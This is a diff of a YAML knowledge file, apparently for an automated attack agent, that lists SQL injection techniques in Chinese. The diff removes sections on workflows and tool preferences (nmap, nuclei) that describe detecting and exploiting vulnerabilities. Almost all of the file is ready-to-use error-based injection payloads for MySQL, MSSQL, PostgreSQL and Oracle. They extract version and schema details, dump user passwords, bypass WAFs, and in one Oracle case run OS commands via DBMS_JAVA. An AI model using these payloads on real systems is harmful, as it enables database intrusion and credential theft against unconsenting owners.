@@ -1,132 +1,170 @@
-name: "SQL注入攻击"
-description: "MySQL、MSSQL、Oracle、PostgreSQL等数据库的SQL注入技术"
-domain: "web"
-version: "1.0"
+name: SQL注入攻击
+description: MySQL、MSSQL、Oracle、PostgreSQL等数据库的SQL注入技术
+domain: web
+version: '1.0'
 tags:
-  - web
-  - sqli
-  - injection
-  - database
+- web
+- sqli
+- injection
+- database
+knowledge: '# 报错注入 (Error-based SQL Injection)
 
-knowledge: |
-  # 报错注入 (Error-based SQL Injection)
-  
+
   ## 1. MySQL报错注入
-  
+
+
   ### extractvalue
-  
+
+
   ```sql
-  ' AND extractvalue(1,concat(0x7e,version()))--
-  ' AND extractvalue(1,concat(0x7e,database()))--
-  ' AND extractvalue(1,concat(0x7e,user()))--
+
+  '' AND extractvalue(1,concat(0x7e,version()))--
+
+  '' AND extractvalue(1,concat(0x7e,database()))--
+
+  '' AND extractvalue(1,concat(0x7e,user()))--
+
   ```
-  
+
+
   ### updatexml
-  
+
+
   ```sql
-  ' AND updatexml(1,concat(0x7e,version()),1)--
-  ' AND updatexml(1,concat(0x7e,(SELECT database())),1)--
+
+  '' AND updatexml(1,concat(0x7e,version()),1)--
+
+  '' AND updatexml(1,concat(0x7e,(SELECT database())),1)--
+
   ```
-  
+
+
   ### floor+rand
-  
+
+
   ```sql
-  ' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+
+  '' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+
   ```
-  
+
+
   ### exp
-  
+
+
   ```sql
-  ' AND EXP(~(SELECT * FROM (SELECT version())a))--
+
+  '' AND EXP(~(SELECT * FROM (SELECT version())a))--
+
   ```
-  
+
+
   ---
-  
+
+
   ## 2. MSSQL报错注入
-  
+
+
   ```sql
-  ' AND 1=1/@@version--
-  ' AND 'a'+'b'='ab' AND 1/0--
+
+  '' AND 1=1/@@version--
+
+  '' AND ''a''+''b''=''ab'' AND 1/0--
+
   ```
-  
+
+
   ---
-  
+
+
   ## 3. PostgreSQL报错注入
-  
+
+
   ```sql
-  ' AND cast(1 as text)||cast(version() as text)--
-  ' AND 1::text||version()--
+
+  '' AND cast(1 as text)||cast(version() as text)--
+
+  '' AND 1::text||version()--
+
   ```
-  
+
+
   ---
-  
+
+
   ## 4. Oracle报错注入
-  
+
+
   ```sql
-  ' AND CTXSYS.DRITHSX.SN(user,(SELECT version FROM dual))--
-  ' AND (SELECT DBMS_JAVA.RUNJAVA('java.lang.Runtime.exec(''id'')') FROM dual)--
+
+  '' AND CTXSYS.DRITHSX.SN(user,(SELECT version FROM dual))--
+
+  '' AND (SELECT DBMS_JAVA.RUNJAVA(''java.lang.Runtime.exec(''''id'''')'') FROM dual)--
+
   ```
-  
+
+
   ---
-  
+
+
   ## 5. 提取数据
-  
+
+
   ### 获取表名
-  
+
+
   ```sql
-  ' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--
+
+  '' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--
+
   ```
-  
+
+
   ### 获取列名
-  
+
+
   ```sql
-  ' AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users')))--
+
+  '' AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name=''users'')))--
+
   ```
-  
+
+
   ### 获取数据
-  
+
+
   ```sql
-  ' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 0,1)))--
+
+  '' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 0,1)))--
+
   ```
-  
+
+
   ---
-  
+
+
   ## 6. 绕过WAF
-  
+
+
   ### 编码绕过
-  
+
+
   ```sql
-  ' AND extractvalue(1,concat(0x7e,(SELECT unhex(hex(database()))))--
+
+  '' AND extractvalue(1,concat(0x7e,(SELECT unhex(hex(database()))))--
+
   ```
-  
+
+
   ### 函数变形
-  
+
+
   ```sql
-  ' AND GEOMETRYCOLLECTION((SELECT * FROM (SELECT * FROM (SELECT version())a)b))--
-  ' AND (SELECT 1 FROM (SELECT NTILE(1) OVER(ORDER BY (SELECT version())))a)--
+
+  '' AND GEOMETRYCOLLECTION((SELECT * FROM (SELECT * FROM (SELECT version())a)b))--
+
+  '' AND (SELECT 1 FROM (SELECT NTILE(1) OVER(ORDER BY (SELECT version())))a)--
+
   ```
-  
 
-workflows:
-  - name: "自动检测和利用"
-    description: "自动检测漏洞并尝试利用"
-    steps:
-      - description: "信息收集和漏洞探测"
-        expected_output: "发现潜在漏洞点"
-      - description: "漏洞验证"
-        expected_output: "确认漏洞存在"
-      - description: "漏洞利用"
-        expected_output: "成功利用漏洞"
-
-tool_preferences:
-  nmap:
-    score: 0.8
-    reason: "端口和服务扫描"
-  nuclei:
-    score: 0.9
-    reason: "漏洞扫描"
-
-examples:
-  - scenario: "发现漏洞并获取敏感信息"
-    solution: "使用工具探测 -> 验证漏洞 -> 获取数据"
-    tools_used: ["nmap", "nuclei"]
+  '
